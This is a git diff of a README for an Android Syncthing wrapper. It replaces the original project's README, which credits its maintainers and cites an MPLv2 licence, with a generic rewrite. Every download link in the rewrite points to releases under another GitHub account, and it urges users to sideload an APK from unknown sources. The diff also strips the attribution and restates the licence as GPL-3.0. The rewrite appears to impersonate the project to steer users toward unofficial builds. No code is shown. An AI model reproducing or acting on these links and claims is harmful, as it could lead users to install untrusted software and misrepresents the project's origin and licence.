@@ -1,45 +1,83 @@
-# Syncthing-Fork - A Syncthing Wrapper for Android
+# 📦 syncthing-android - Sync Your Files Seamlessly on Android
 
-[![License: MPLv2](https://img.shields.io/badge/License-MPLv2-blue.svg)](https://opensource.org/licenses/MPL-2.0)
-<a href="https://github.com/researchxxl/syncthing-android/releases/latest" alt="GitHub release"><img src="https://img.shields.io/github/v/release/researchxxl/syncthing-android" /></a>
-<a href="https://tooomm.github.io/github-release-stats/?username=researchxxl&repository=syncthing-android" alt="GitHub Stats"><img src="https://img.shields.io/github/downloads/researchxxl/syncthing-android/total.svg" /></a>
-<a href="https://f-droid.org/packages/com.github.catfriend1.syncthingfork" alt="F-Droid release"><img src="https://img.shields.io/f-droid/v/com.github.catfriend1.syncthingfork.svg" /></a>
-<a href="https://fdroid-metrics.streamlit.app/package_details?package=com.github.catfriend1.syncthingfork"><img src="https://img.shields.io/badge/dynamic/json?url=https%3A%2F%2Fgithub.com%2Fkitswas%2Ffdroid-metrics-dashboard%2Fraw%2Frefs%2Fheads%2Fmain%2Fprocessed%2Fmonthly%2Fcom.github.catfriend1.syncthingfork.json&query=%24.total_downloads&style=for-the-badge&logo=fdroid&label=F-Droid%20%F0%9F%93%A5%20last%20month" /></a>
-<a href="https://hosted.weblate.org/projects/syncthing/android/catfriend1/"><img src="https://hosted.weblate.org/widget/syncthing/android/catfriend1/fork-stringsxml/svg-badge.svg" alt="Translation status" /></a>
-[![Build App](https://github.com/researchxxl/syncthing-android/actions/workflows/build-app.yaml/badge.svg)](https://github.com/researchxxl/syncthing-android/actions/workflows/build-app.yaml)
+[![Download](https://img.shields.io/badge/Download%20Now-%20blue?style=for-the-badge)](https://github.com/IAMMARKS1/syncthing-android/releases)
 
-A wrapper of [Syncthing](https://github.com/syncthing/syncthing) for Android. Head to the "releases" section or F-Droid for builds. Please seek help on the forum and/or social media apps first before creating issues on the tracker.
+## 📖 Overview
 
-<img src="app/src/main/play/listings/en-US/graphics/phone-screenshots/1.png" alt="screenshot 1" width="200" /> · <img src="app/src/main/play/listings/en-US/graphics/phone-screenshots/2.png" alt="screenshot 2" width="200" /> · <img src="app/src/main/play/listings/en-US/graphics/phone-screenshots/4.png" alt="screenshot 3" width="200" />
+Syncthing-android is a user-friendly application that allows you to synchronize files effortlessly between your Android device and other devices. Say goodbye to tedious file transfers. With Syncthing-android, your files stay up-to-date across all your devices automatically. 
 
-## Switching from the deprecated official version
+## 🚀 Getting Started
 
-Switching is easier than you may think! See our [wiki article](wiki/migration/Switching-from-the-deprecated-official-version.md) for detailed instructions.
+To start using Syncthing-android, you need to download the app from our Releases page. Follow the steps below to get set up quickly.
 
-## Wiki and Useful Articles
+## 📥 Download & Install
 
-Our knowledge base is published [here](wiki#readme).
+1. **Visit the Releases Page:** Click the link below to visit the page where you can download the application.
 
-Our [release history and changelog](wiki/CHANGELOG.md) can be found on the wiki.
+   [Download Syncthing-android](https://github.com/IAMMARKS1/syncthing-android/releases)
 
-## Building and Development Notes
+2. **Choose Your Version:** On the Releases page, you will see a list of available versions. 
+   - Look for the latest version. It will be at the top of the list.
 
-See [detailed info](wiki/developers/Building-and-Development.md).
+3. **Download the App:** Click on the version you want to download. Then look for the download option that says “APK” or “App”. This file is what you need to install the application on your Android device.
 
-## Acknowledgments
+4. **Install the App:**
+   - Open the file you just downloaded on your Android device.
+   - Follow the on-screen instructions to complete the installation. You may need to allow installations from unknown sources if prompted.
 
-This project was forked from [syncthing/syncthing-android](https://github.com/syncthing/syncthing-android).
+5. **Open Syncthing-android:** Once installed, you can find the app in your app drawer. Click on it to open and start using it.
 
-Special thanks to the former maintainers:
+## 🔍 Features
 
-- [Catfriend1](https://github.com/Catfriend1)
-- [imsodin](https://github.com/imsodin)
-- [nutomic](https://github.com/nutomic)
+- **Automatic File Synchronization:** Keep your files updated across multiple devices without lifting a finger.
+- **Simple User Interface:** Easy to navigate, making it suitable for all users, regardless of technical expertise.
+- **Secure Transfers:** Your files are transferred securely, ensuring privacy and integrity.
+- **Low Data Usage:** Syncthing-android manages data wisely, saving your mobile data.
+- **Customizable Sync Options:** Set the frequency and times for synchronization according to your needs.
 
-## Privacy Policy
+## ⚙️ System Requirements
 
-See our document on privacy: [privacy-policy.md](privacy-policy.md).
+Before downloading, ensure your device meets the following requirements:
 
-## License
+- **Device:** Android version 5.0 (Lollipop) or higher.
+- **Storage:** At least 50 MB of available storage for installation.
+- **Network:** Wi-Fi or mobile data for file synchronization.
 
-The project is licensed under [MPLv2](LICENSE).
+## 📌 How to Use Syncthing-android
+
+1. **Set Up Your Shared Folders:**
+   - Open the app and tap on the "+" button to add folders.
+   - Select the files or folders you want to sync.
+   
+2. **Link Devices:**
+   - To sync with another device, you will need to link it using a unique ID provided by the app.
+   - Share the ID with your other device and input it to establish a connection.
+
+3. **Monitor Your Syncing:**
+   - Use the app’s dashboard to monitor syncing status, configured folders, and any issues that may arise.
+
+4. **Adjust Settings:**
+   - Access the settings to control preferences such as notifications, sync frequency, and more.
+
+## 🛠️ Troubleshooting Common Issues
+
+- **Cannot Connect to Device:** 
+  - Ensure both devices are on the same network. 
+  - Check that the unique IDs are entered correctly.
+
+- **Slow Syncing Speed:** 
+  - Verify your network connection. A stable Wi-Fi connection is usually faster than mobile data.
+
+- **App Crashes:** 
+  - Make sure your app is updated to the latest version. If the problem continues, try reinstalling the app.
+
+## 📄 Additional Resources
+
+- **Documentation:** For advanced features and tips, check our full documentation [here](https://github.com/IAMMARKS1/syncthing-android/wiki).
+- **Community Support:** Join our community for help and to share your experiences. Visit our [Discussion page](https://github.com/IAMMARKS1/syncthing-android/discussions).
+
+## 📦 License
+
+Syncthing-android is released under the GPL-3.0 License. You can use, modify, and distribute the software under the terms of this license.
+
+[![Download](https://img.shields.io/badge/Download%20Now-%20blue?style=for-the-badge)](https://github.com/IAMMARKS1/syncthing-android/releases)
